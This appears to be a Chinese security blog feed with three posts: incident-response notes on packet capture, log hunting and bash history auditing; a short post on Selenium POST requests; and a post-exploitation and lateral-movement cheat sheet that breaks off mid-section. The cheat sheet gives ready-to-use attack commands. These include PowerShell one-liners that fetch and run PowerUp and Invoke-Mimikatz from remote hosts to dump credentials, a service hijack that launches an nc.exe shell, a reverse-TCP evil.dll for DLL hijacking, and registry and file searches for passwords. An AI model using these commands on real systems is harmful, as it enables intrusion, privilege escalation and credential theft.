<p>抓取所有经过 eth1，源地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中</p>
<div class="highlighter-rouge"><pre class="highlight"><code>tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
</code></pre>
</div>

<p>抓取网口1 源端口是25的数据，保存到xx.pcap中</p>
<div class="highlighter-rouge"><pre class="highlight"><code># tcpdump -i eth1 src port 25  -w   xx.pcap
</code></pre>
</div>

<p>抓取网口1 目的端口是25的数据，保存到xx.pcap中</p>
<div class="highlighter-rouge"><pre class="highlight"><code># tcpdump -i eth1 dst port 25  -w   xx.pcap
</code></pre>
</div>

<p>抓整个包：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#tcpdump -X -s 0 host 192.168.1.12
</code></pre>
</div>

<p>抓68字节：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#tcpdump -X host 192.168.1.12
</code></pre>
</div>
<p>对应的端口抓包：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#tcpdump -X udp port 1812
</code></pre>
</div>

<p>wireshak工具抓包：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wireshak工具抓包
tcp.port == 6789

过滤源ip、目的ip。在wireshark的过滤规则框Filter中输入过滤条件。如查找目的地址为192.168.101.8的包，ip.dst==192.168.101.8；查找源地址为ip.src==1.1.1.1；

使用wireshark常用的过滤命令
端口过滤。如过滤80端口，在Filter中输入，tcp.port==80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport==80只过滤目的端口为80的，tcp.srcport==80只过滤源端口为80的包；

使用wireshark常用的过滤命令
协议过滤比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议；

使用wireshark常用的过滤命令
http模式过滤。如过滤get包，http.request.method=="GET",过滤post包，http.request.method=="POST"；

使用wireshark常用的过滤命令
连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。
</code></pre>
</div>

<p>pcap文件过滤和合并：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>通过 editcap， 我们能以很多不同的规则来过滤 pcap 文件中的内容，并且将过滤结果保存到新文件中。

首先，以“起止时间”来过滤 pcap 文件。 " - A &lt; start-time &gt; 和 " - B &lt; end-time &gt; 选项可以过滤出在这个时间段到达的数据包（如，从 2:30 ～ 2:35）。时间的格式为 “ YYYY-MM-DD HH:MM:SS"。

$ editcap -A '2014-12-10 10:11:01'-B '2014-12-10 10:21:01' input.pcap output.pcap
也可以从某个文件中提取指定的 N 个包。下面的命令行从 input.pcap 文件中提取100个包（从 401 到 500）并将它们保存到 output.pcap 中：

$ editcap input.pcap output.pcap 401-500
使用 "-D &lt; dup-window &gt;" （dup-window可以看成是对比的窗口大小，仅与此范围内的包进行对比）选项可以提取出重复包。每个包都依次与它之前的 &lt; dup-window &gt; -1 个包对比长度与MD5值，如果有匹配的则丢弃。

$ editcap -D 10 input.pcap output.pcap
遍历了 37568 个包, 在 10 窗口内重复的包仅有一个，并丢弃。

也可以将 &lt; dup-window &gt; 定义成时间间隔。使用"-w &lt; dup-time-window &gt;"选项，对比&lt; dup-time-window &gt; 时间内到达的包。

$ editcap -w 0.5 input.pcap output.pcap
检索了 50000 个包, 以0.5s作为重复窗口，未找到重复包。

分割 pcap 文件
当需要将一个大的 pcap 文件分割成多个小文件时，editcap 也能起很大的作用。

将一个 pcap 文件分割成数据包数目相同的多个文件

$ editcap -c &lt;packets-per-file&gt;&lt;input-pcap-file&gt;&lt;output-prefix&gt;
输出的每个文件有相同的包数量，以 &lt; output-prefix &gt;-NNNN的形式命名。

以时间间隔分割 pcap 文件

$ editcap -i &lt;seconds-per-file&gt;&lt;input-pcap-file&gt;&lt;output-prefix&gt;
合并 pcap 文件
如果想要将多个文件合并成一个，用 mergecap 就很方便。

当合并多个文件时，mergecap 默认将内部的数据包以时间先后来排序。

$ mergecap -w output.pcap input.pcap input2.pcap [input3.pcap ...]
如果要忽略时间戳，仅仅想以命令行中的顺序来合并文件，那么使用 -a 选项即可。

例如，下列命令会将 input.pcap 文件的内容写入到 output.pcap, 并且将 input2.pcap 的内容追加在后面。

$ mergecap -a -w output.pcap input.pcap input2.pcap
总结
在这篇指导中，我演示了多个 editcap、 mergecap 操作 pcap 文件的例子。除此之外，还有其它的相关工具，如 reordercap用于将数据包重新排序，text2pcap 用于将 pcap 文件转换为文本格式， pcap-diff用于比较 pcap 文件的异同，等等。当进行网络入侵测试及解决网络问题时，这些工具与包注入工具非常实用，所以最好了解他们.
</code></pre>
</div>

<h3 id="入侵方式分析">入侵方式分析</h3>

<p>滚雪球式线性拓展</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
</code></pre>
</div>

<p>常见的入侵方式Getshell方法</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) WEB入侵
</code></pre>
</div>

<p>滚雪球式线性拓展</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
</code></pre>
</div>

<p>常见的入侵方式Getshell方法</p>

<div class="highlighter-rouge"><pre class="highlight"><code>a) WEB入侵
i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell
ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞
b) 系统入侵
i. SSH 破解后登录操作
ii. RDP 破解后登录操作
iii. MSSQL破解后远控操作
iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）
c) 典型应用

i. Mail暴力破解后信息挖掘及漏洞利用
ii. VPN暴力破解后绕过边界
iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行
iv. Rsync 未授权访问类
v. Mongodb未授权访问类
vi. Elasticsearch命令执行漏洞
vii. Memcache未授权访问漏洞
viii. 服务相关口令（mysql ldap zebra squid vnc smb）
</code></pre>
</div>

<h3 id="应急大致流程">应急大致流程</h3>

<ul>
  <li>
    <p>询问（问：1.当前情况。主要是问当前发现了哪些异常；2.服务器组件部署情况；3.是否处于内网环境？是否还有其他关联服务器？4.如果当前服务器上部署了web应用还需要问这个项目是否经过安全测试？）</p>
  </li>
  <li>
    <p>事件处理
需要依据对项目组询问的结果进行排查，心里大概列出攻击者可能通过哪几条路进来并且在心里进行排序。这块的依据是基础知识那块的第二点，能不能快速的找到问题取决于你是否了解常见的攻击套路。</p>
  </li>
  <li>
    <p>初步对事件进行判断，是否需要关停业务或者是否需要隔离被攻击主机，是否需要对被攻击主机进行断网等等，防止损失/危害进一步扩大。</p>
  </li>
  <li>
    <p>建讨论组。拉相关人员进组方便沟通交流（一般包括：项目组运维、开发、领导、我方的事件处理人员、领导）</p>
  </li>
  <li>依据上一步的排序结果进行对应日志调取，需要注意的是：日志不要在线上服务器进行分析，将线上日志打包下载回本地。不要在线上服务器进行任何多余的操作，操作的时候要小心小心再小心。可以让项目组的韵味取日志之后再发给你。对日志进行分析（考虑到我们这边项目的特征一般采用Linux下shell分析的方式，对于windows自带的事件日志一般采用splunk或者windows自带的日志分析工具或者log parser）比如通过询问了解到这台被黑的服务器用到了tomcat并且manager也存在弱口令，那么你首先需要调取的就是tomcat的日志，因为tomcat manager的入侵是需要上传war包，所以你的语句应该是：
    <div class="highlighter-rouge"><pre class="highlight"><code>cat log.log | grep -i ".war"
</code></pre>
    </div>
  </li>
  <li>
    <p>如果上一步骤中你找到了异常的war包（看文件名看上传时间）那么需要在服务器中找到这个war包下载到本地进行分析（主要分析是否是恶意的war包，如果是他的主要作用是什么）依据war包第一次上传的时间为准通过日志整理出攻击者的攻击时间线，依据时间线进行整体的入侵行为分析。分析攻击者在这个时间段内做了什么。</p>
  </li>
  <li>
    <p>如果被黑服务器处在内网还需要对内网其他服务器进行分析，是否存在被黑的情况，重点关注和被黑服务器共享同一密码的服务器。</p>
  </li>
  <li>
    <p>如果服务器中存在恶意的二进制文件，需要对二进制文件进行分析。使用IDA Pro对恶意文件进行静态分析，使用在线文件分析平台（金山火眼、文件B超、virustotal等等）对恶意文件进行动态分析。结合两者的分析结果判定恶意文件的行为，例如是否会对服务器系统文件进行替换？是否感染了系统其他关键文件？是否将自身写入开机启动项？同时可以将恶意文件的md5值放到网上搜索看看有没有人已经对该恶意文件进行过分析。</p>
  </li>
  <li>
    <p>确定此次事件的影响大小。</p>
  </li>
  <li>报告</li>
</ul>

<h3 id="基本应急建议">基本应急建议</h3>

<p>Kill恶意进程：</p>
<blockquote>
  <p>32位用wsyscheck，从自启动、服务里找，最重要的是杀白金这类注入进程的需要他的卸载模块功能，你kill进程立即重启。</p>
</blockquote>

<blockquote>
  <p>64位任务管理器加注册表编辑器足够了，右键转至服务非常好用，除了挖矿的，其他的木马后门都会*32，直接kill，kill不了的注册表里改了然后重启。</p>
</blockquote>

<p>WEBSHELL寻找：</p>

<blockquote>
  <p>1）扫描特征
通常日志中会伴随一些其他攻击特征，例如可以用如下语句
egrep ‘(select|script|acunetix|sqlmap)’ /var/log/httpd/access_log</p>
</blockquote>

<blockquote>
  <p>2）访问频次
重点关注POST请求
grep ‘POST’ /var/log/httpd/access_log | awk ‘{print $1}’ | sort | uniq -c | sort -nr</p>
</blockquote>

<blockquote>
  <p>3）Content-Length
Content-Length过大的请求，例如过滤Content-Length大于5M的日志
awk ‘{if($10&gt;5000000){print $0}}’ /var/log/httpd/access_log</p>
</blockquote>

<blockquote>
  <p>注意
这里如果发现文件，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</p>

</blockquote>

<p>基本建议：</p>
<blockquote>
  <p>C:\Users\XXX\Desktop 新建用户的桌面，可能会有残留文件
查看杀毒软件日志
查看安全性日志，是否存在大量审核失败的日志（暴力破解）若该帐号本身已被删除，则”用户”处将不会显示帐号名，而是显示一串帐号的SID值。
查看安全性日志，特殊事件，比如说648特殊事件为创建账户事件</p>
</blockquote>

<p>这里列举一些有关检测时常见的事件ID:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>事件ID：517     审核日志已经清除
事件ID：528     登陆成功                      可以显示客户端连接ip地址
事件ID：529   登录失败。试图使用未知的用户名或已知用户名但错误密码进行登录
事件ID：683     会话从 winstation 中断连接     可以查看客户端计算机名
事件ID：624     创建了用户帐户
事件ID：626     启用了用户帐户
事件ID：627     用户密码已更改
事件ID：628     设置了用户密码
事件ID：630   用户帐户已删除。
事件ID：632： 成员已添加至全局组
事件ID：635： 已新建本地组。 
事件ID：643： 域策略已修改。
</code></pre>
</div>
<p>必要时配置下history</p>

<p>1、命令历史记录中加时间</p>

<div class="highlighter-rouge"><pre class="highlight"><code>默认情况下如下图所示，没有命令执行时间，不利于审计分析。

通过设置export HISTTIMEFORMAT='%F %T '，让历史记录中带上命令执行时间。

注意”%T”和后面的”’”之间有空格，不然查看历史记录的时候，时间和命令之间没有分割。

要一劳永逸，这个配置可以写在/etc/profile中，当然如果要对指定用户做配置，这个配置可以写在/home/$USER/.bash_profile中。

本文将以/etc/profile为例进行演示。

要使配置立即生效请执行source /etc/profile，我们再查看history记录，可以看到记录中带上了命令执行时间。

如果想要实现更细化的记录，比如登陆过系统的用户、IP地址、操作命令以及操作时间一一对应，可以通过在/etc/profile里面加入以下代码实现

export HISTTIMEFORMAT="%F %T 'who -u am i 2&gt;/dev/null| awk '{print $NF}'|sed -e 's/[()]//g ''whoami' "，注意空格都是必须的。

修改/etc/profile并加载后，history记录如下，时间、IP、用户及执行的命令都一一对应。

通过以上配置，我们基本上可以满足日常的审计工作了，但了解系统的朋友应该很容易看出来，这种方法只是设置了环境变量，攻击者unset掉这个环境变量，或者直接删除命令历史，对于安全应急来说，这无疑是一个灾难。

针对这样的问题，我们应该如何应对，下面才是我们今天的重点，通过修改bash源码，让history记录通过syslog发送到远程logserver中，大大增加了攻击者对history记录完整性破坏的难度。
</code></pre>
</div>

<p>2、修改bash源码，支持syslog记录</p>

<div class="highlighter-rouge"><pre class="highlight"><code>首先下载bash源码，可以从gnu.org下载，这里不做详细说明了，系统需要安装gcc等编译环境。我们用bash4.4版本做演示。

修改源码：bashhist.c

修改源码config-top.h，取消/#define SYSLOG_HISTORY/这行的注释

编译安装，编译过程不做详细说明，本文中使用的编译参数为： ./configure –prefix=/usr/local/bash，安装成功后对应目录如下：

此时可以修改/etc/passwd中用户shell环境，也可以用编译好的文件直接替换原有的bash二进制文件，但最好对原文件做好备份。

替换时要注意两点:

1、一定要给可执行权限，默认是有的，不过有时候下载到windows系统后，再上传就没有可执行权限了，这里一定要确定，不然你会后悔的；

2、替换时原bash被占用，可以修改原用户的bash环境后再进行替换。

查看效果，我们发现history记录已经写到了/var/log/message中。

如果要写到远程logserver，需要配置syslog服务，具体配置这里不做详细讲解，大家自己研究，发送到远端logserver效果如下图所示。

通过以上手段，可以有效保证history记录的完整性，避免攻击者登录系统后，通过取消环境变量、删除history记录等方式抹掉操作行为，为安全审计、应急响应等提供了完整的原始数据
</code></pre>
</div>

<h4 id="后记">后记</h4>

<p>本文将持续更新，将作者遇到的一些应急的内容和技巧添加到里面，其中有部分内容参考了各大安全论坛的资料，再次感谢其他作者的付出。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[关于selenium的post方法思考]]></title>
      <url>/spider/2018/04/18/selenium-post-func/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>Selenium是一款比较常见的web应用自动化测试系统，它支持多种浏览器，多用于在爬虫中解决JavaScript渲染问题。</strong></span>
	
</p>

<p>当requests，urllib*无法正常获取网页内容的时候，用它模拟浏览器进行网页加载，可以得到一些无法直接在网页源代码里面看到的内容。</p>

<p>利用selenium及其相关的库，笔者大概尝试过搭配headless chrome、headless firefox，以及快要凉凉的过气选手phantomjs。这几种无界面浏览器当然各有千秋，这里不做过多评论。</p>

<p>由于selenium原生代码似乎是不带post方式的，故此在测试用例时，很是费了一些精力。在这里，笔者会以headless firefox模式为例，简单谈一下在selenium下如何进行post数据。</p>

<h4 id="第三方库">第三方库</h4>

<p>以seleniumrequests为例，这个库是一个selenium扩展，使得selenium下也可以使用requests的功能，我们可以采用pip安装：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>pip install selenium-requests
</code></pre>
</div>
<p>当然，这个库使用起来也是很简单的：</p>
<div class="highlighter-rouge"><pre class="highlight"><code># selenium.webdriver from the seleniumrequests module
from seleniumrequests import Firefox

# Simple usage with built-in WebDrivers:
webdriver = Firefox()
response = webdriver.request('GET', 'https://www.google.com/')
print(response)
</code></pre>
</div>
<p>不过这个库也有它的缺点，不方便自定义一些驱动参数，无法设置headless状态（也许是我没找到方法）。有兴趣的朋友可以自行研究下，其支持方法如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; dir(seleniumrequests)
['Android', 'Chrome', 'Firefox', 'Ie', 'Opera', 'PhantomJS', 'Remote', 'RequestMixin', 'Safari', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '__path__', '__warningregistry__', 'request']
</code></pre>
</div>

<p>想象一下画面，爬一次页面弹就会给你弹一个浏览器出来，这TM真酸爽。</p>

<h4 id="html点击大法好">HTML点击大法好</h4>

<p>个人不太喜欢这种法子，不过好像有一部分人比较推崇。其原理是解析post请求后，将其传递的参数重构为form表单，最后再将这些新生成的代码存入html网页。</p>

<p>最后，会再借用selenium定位submit元素，触发事件提交表单。</p>

<p>窃以为这种方法不太妥帖，每开一个网页程序就得生成一个新的html文件。先不论程序是否一定具有写入和删除的权限，如果运行的次数增多后，明显会增加机器负担。</p>

<h4 id="ajax代行天子令">Ajax代行天子令</h4>

<p>Ajax模拟post发送请求，这是笔者自己采用的办法。当然，不一定是最好的。</p>

<p>无论是原生JS的XMLHttpRequest，还是Jquery，都可以模拟生成ajax post请求，最后再借助selenium执行JS代码。</p>

<p>XMLHttpRequest示例片段：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>brower = webdriver.Firefox(firefox_options=fireFoxOptions)
js = """var xmlhttp=new XMLHttpRequest();
        xmlhttp.open("GET","http://127.0.0.1/phproot/echo.php",false);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.setRequestHeader("X-Forwarded-For","test");
        xmlhttp.setRequestHeader("Referer","test");
        xmlhttp.setRequestHeader("User-Agent","Mozilla/5.0");
        xmlhttp.setRequestHeader("Cookie","");
        xmlhttp.send("test=1");
        return xmlhttp.responseText;
	    """ 
brower.implicitly_wait(30)
#time.sleep(30)
resp = brower.execute_script(js)
</code></pre>
</div>
<p>Jquery示例片段：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>jquery = open("jquery.min.js", "r").read()

driver = webdriver.Firefox(firefox_options=fireFoxOptions)
driver.execute_script(jquery)

ajax_query = '''
            $.ajax('%s', {
            type: %s,
            data: %s, 
            headers: { "User-Agent": "Mozilla/5.0" },
            crossDomain: true,
            xhrFields: {
             withCredentials: true
            },
            success: function(){}
            });
            ''' % (url, request_type, data)

ajax_query = ajax_query.replace(" ", "").replace("\n", "")
resp = driver.execute_script("return " + ajax_query)
</code></pre>
</div>
<p>但这样做还是有缺陷，通过driver.get预访问一次将要请求的URL，我们能解决跨域的问题。</p>

<p>但是由于w3g的安全设定，我们无法自行在JS中预置cookie（可以通过传递解决）、Referer等等危险的头部参数。</p>

<p>如若我们需要fuzz请求包头部一些冷门的参数，这样使用就会有一定的局限性。</p>

<h4 id="尾声">尾声</h4>

<p>总而言之，selenium没有自带原生post方式是一个遗憾，而且其调用headless模式的浏览器，渲染和启动也显得太慢了些，无法用于高并发。</p>

<p>还是那句话，个人觉得在资源有限的情况下，它不太适用于高并发的大规模测试，fuzz指定的一定量payload也许尚可。</p>
]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[内网横向与后渗透辞典]]></title>
      <url>/pentest/2018/01/18/pentest-innet-and-permission-maintenance/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在内网横向与后渗透的过程中，会有一些细节比较蛋疼。而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买去。</strong></span>
</p>

<p>换而言之，无论做什么都需要积累。在这篇文章中，鄙人将根据个人库存和网上参考资料做一些总结。</p>

<p>学无止境，我在以后还会做一些引用和补充，希望能提升自我和帮助有缘人。</p>

<h3 id="取得突破口">取得突破口</h3>

<p>在外网进入内网时，我们可能需要一个突破口，可能会存在以下几种情况：</p>

<ul>
  <li>通过SQL注入获取shell。</li>
  <li>通过命令执行获取shell。</li>
  <li>通过前后台上传恶意脚本直接获取webshell</li>
  <li>通过上传解析进行命令执行（csv、xml和shtml等）。</li>
  <li>通过未授权代理和弱/默认口令VPN获取入口。</li>
  <li>通过CSRF写shell。</li>
  <li>通过XSS作为代理，探测内网。</li>
  <li>钓鱼获得shell。</li>
</ul>

<h3 id="提取信息">提取信息</h3>

<h5 id="windows信息提取">Windows信息提取</h5>

<p>查看基本信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>set | systeminfo (环境变量及补丁信息)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

#(已知的主机名/是否开启默认共享/有无特殊服务)
#此处可以加上 /domain
net users | net view | net share | net start |net group 

#查看加入到域内的所有计算机名
net group "domain computers" /domain 

#查看域控制器
net group "domain controllers" /domain 

#查看指定用户
net user hacker /domain

#获得域密码策略设置，密码长短，错误锁定等信息
net accounts /domain 


route print 查看路由
arp -A 查看路由表

netstat -ano | tasklist /svc (查看进程所开端口)

query user (当前在线的用户状态)

schtasks /query /fo LIST /v 查看计划任务

net user administrator
(查看最近更改密码时间，有可能只是在原密码的基础上做了简单变换, 比如把xxx@2016换成xxx@2017)

netsh firewall show state | netsh firewall show config | netsh advfirewall firewall show rule name=all (cmd下查看防火墙配置)

手动到处翻翻翻：
txt/doc/xls/ppt

查询含有特定文件名和内容的文件：
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

注册表里查询：
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

#能得到部分工作站和域敏感信息
net config workstation

#有正确返回则为域用户
net time /domain


</code></pre>
</div>
<p>枚举提权：</p>

<p>一般是通过脚本枚举补丁，然后输出MS-***，市面上工具比较杂，这里不一一列举。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

https://github.com/GDSSecurity/Windows-Exploit-Suggester

</code></pre>
</div>

<h5 id="linux信息提取">Linux信息提取</h5>

<p>查看基本信息：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ps auxfww (查看进程详细信息)
netstat -tlnp (所有监听的TCP端口)
netstat -antp | ss -antp (所有活动的TCP连接, 分析哪些IP与当前主机有关联)
cat /etc/issue /etc/*release /proc/version (系统版本信息)
cat /etc/passwd (查看用户配置, 哪些用户可以登陆系统)
cat /etc/hosts (主机名解析配置, 一般这里的IP都是跟当前主机关联度比较高的)
cat /etc/resolv.conf (查看DNS服务器IP, 内网DNS服务器存在域传输漏洞的可能性较高)
id; uname -a; hostname; w; who; lastlog
</code></pre>
</div>
<p>查看敏感信息【也用于应急】：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cat /root/.bash_history | grep -Ei -C 2 'ssh|mysql|ftp|scp|su|root|passwd' (过滤历史命令记录中的敏感关键字,显示上下各两行)
loacte passwd; locate shadow; locate config.*(properties等配置文件后缀); locate .bash_history; locate .mysql_history; locate authorized_keys
find / -perm +6000 -ls 2&gt;/dev/null | grep -v proc (查找具有SUID/SGID权限的文件和目录)
find / -writable -ls 2&gt;/dev/null | grep -v proc (查找对当前用户具有写权限的文件和目录)
cat /etc/crontab (计划任务中的执行脚本是否有修改权限)
sudo -l (查看当前用户具有哪些sudo权限)
sudo -V (某些版本的sudo存在提权漏洞)
ls -latr /etc/ (查看哪些配置文件最近被修改过)
ls -l /etc/shadow* (查看shadow文件是否有备份, 权限配置是否正确)
cat /etc/security/opasswd (保存了曾经使用过的密码hash)
</code></pre>
</div>

<p>内核提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>CentOS 2.6.32 (2013年之前)
https://www.exploit-db.com/exploits/25444/
CVE-2010-3847 (RHEL5版本)
https://www.nigesb.com/cve-2010-3847-exp-centos.html
https://www.exploit-db.com/exploits/25444/
</code></pre>
</div>

<p>枚举提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>searchsploit (本地搜索漏洞库)
linuxprivchecker.py (自动检测提权漏洞的脚本)
</code></pre>
</div>

<h5 id="密码获取">密码获取</h5>

<p>注册表读取自动登陆帐户密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>(cmd) reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
(msf) post/windows/gather/credentials/windows_autologin
</code></pre>
</div>

<p>powershell篇：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>1.Empire 【综合渗透工具，类似于msf】
可以生成木马，信息收集，提权，横向渗透以及后门
https://github.com/EmpireProject/Empire.git

2.PowerUp 提权神器
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://192.168.31.247/PowerUp.ps1');Invoke-AllChecks”
powershell -exec bypass -Command "&amp; {Import-Module .PowerUp.ps1; Invoke-AllChecks}"

3.PowerView 域渗透神器
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

</code></pre>
</div>

<p>powershell读取系统密码【示例，需要xp和2003以上的系统才自带powershell】：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe -exec bypass -Command "&amp; {Import-Module .\powerview.ps1;Invoke-UserHunter}"
powershell===&gt;Import-Module .\powerview.ps1 ===&gt;Invoke-UserHunter
</code></pre>
</div>

<p>导出系统密码或者hash,在导出域hash部分有详细介绍：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter/mimikatz/pwdump7/wce/Getpwd_k8/QuarksPwDump
https://github.com/gentilkiwi/mimikatz/
</code></pre>
</div>

<p>重启记录密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>更新KB2871997补丁后，可禁用Wdigest Auth强制系统的内存不保存明文口令。这时需要修改注册表键值，启用Wdigest Auth，自动锁屏，等待用户重新登录判断当前锁屏状态，用户解锁登录后立即导出明文口令：
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
</code></pre>
</div>

<p>Meterpreter获取所有用户的hash：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1.msf有两个模块可以使用，一个是hashdump，此模块只能导出本地的hash，大家测试就可以知道了，另外一个是smart_hashdump,此模块可以用来导出域用户的hash。
</code></pre>
</div>
<p>powershell有可以直接导出的模块，大家自行尝试一下。</p>

<p>win2012修改注册表，再次登录可获取密码：</p>
<blockquote>
  <p>需要HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的”UseLogonCredential”设置为1，类型为DWORD 32才可以，然后下次用户再登录，就能记录到明文密码了。</p>
</blockquote>

<blockquote>
  <p>在不存在该字段时，添加UseLogonCredential就行。</p>
</blockquote>

<p>导出部分重要第三方软件密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>k8getteamviewpwd
http://qqhack8.blog.163.com/blog/static/11414798520156543210624/

浏览器密码读取（多种）

多种读取密码工具
http://www.nirsoft.net/

Teamview读取密码工具【吐司版】

winscp还原明文密码
post/windows/gather/credentials/winscp

Get-GPPPassword(PS)
获取AD域中SYSVOL和组策略首选项中的密码
https://xianzhi.aliyun.com/forum/topic/1653/

Unattended Installs
自动安装允许程序残留xml，全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中。除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件：

C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\

MSF module：post/windows/gather/enum_unattend
</code></pre>
</div>

<p>LAPS获取密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://wooyun.jozxing.cc/static/drops/tips-10496.html
</code></pre>
</div>

<p>在线破解hash网站：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.objectif-securite.ch/en/ophcrack.php
http://www.cmd5.com
这尼玛太少了，谁帮我加点。

</code></pre>
</div>
<p>离线破解：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ophcrack/hashcat/john the ripper

hashcat 可以组合字典破解，还可以根据规则处理字典
https://hashcat.net/wiki/doku.php?id=mask_attack
/usr/share/hashcat/rules/ 目录存放了默认的规则文件。
</code></pre>
</div>

<h3 id="win提升权限">Win提升权限</h3>

<p>检查是否存在可以提权的第三方应用：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>serv-u/filezilla/flashfxp/winscp/mysql/mssql/radmin
</code></pre>
</div>

<p>服务配置不当提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>有的服务以system权限运行, 但是权限配置不当, 导致普通用户可以通过 sc config 修改程序路径。

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

查看权限
#这个也行
icacls "C:\Program Files (x86)\Privacyware"

sc qc Spooler【某示例程序】
accesschk.exe -ucqv Spooler
accesschk.exe -ucqv *

===================================
#正题在下面
accesschk.exe -uwcqv "Authenticated Users" *
#结果查出来是upnphost
accesschk.exe -ucqv upnphost

sc qc upnphost
sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
#弹出shell

#测试是否everyone有权限
icacls "C:Program Files\Program Folder\A Subfolder\OmniServers.exe"
#Install-ServiceBinary模块，通过Write-ServiceBinary写一个C#的服务用来添加用户:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'OmniServers'-UserName shuteer -Password Password123!


#提权成功以后我们需要清除入侵的痕迹，把所有的状态恢复到最初的状态，可以使用如下命令恢复：
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Restore-ServiceBinary -ServiceName 'OmniServers'

#漏洞利用原理：该漏洞产生的原因是因为用户开启了windows installer特权安装功能:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1'); Get-RegistryAlwaysInstallElevated
#检测注册表是否设置，得到true【好像False也能继续】
运行Write-UserAddMSI模块，运行后生成文件UserAdd.msi
#普通用户运行：
msiexec /q /i UserAdd.msi
</code></pre>
</div>

<p>劫持提权:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>有的服务程序路径包含空格, 且路径没有被引号包含, 利用Windows寻找可执行文件的顺序, 劫持启动自定义程序。
http://www.greyhathacker.net/?p=738
http://www.freebuf.com/vuls/87463.html

echo %path%
accesschk.exe -dqv "C:\Python27"
cacls "C:\Python27"

msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &gt; 
/root/Desktop/evil.dll
copy evil.dll C:\Python27\wlbsctrl.dll
#重启生效

#也可以看看计划任务里有没有可疑目录
#比如出现了
